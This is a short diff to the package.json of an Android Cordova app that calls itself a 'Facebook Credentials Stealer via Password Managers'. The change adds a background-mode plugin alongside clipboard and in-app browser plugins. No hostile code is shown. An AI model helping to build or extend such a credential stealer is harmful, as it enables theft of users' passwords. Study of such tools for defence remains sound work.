@@ -4,6 +4,7 @@
     "description": "Facebook Credentials Stealer via Password Managers",
     "dependencies": {
         "cordova-android": "^6.2.3",
+        "cordova-plugin-background-mode": "^0.7.2",
         "cordova-plugin-clipboard": "1.0.0",
         "cordova-plugin-console": "1.0.5",
         "cordova-plugin-device": "1.1.4",
@@ -44,7 +45,8 @@
             "com.verso.cordova.clipboard": {},
             "cordova-plugin-inappbrowser": {},
             "cordova-plugin-clipboard": {},
-            "cordova-plugin-x-toast": {}
+            "cordova-plugin-x-toast": {},
+            "cordova-plugin-background-mode": {}
         },
         "platforms": [
             "android"
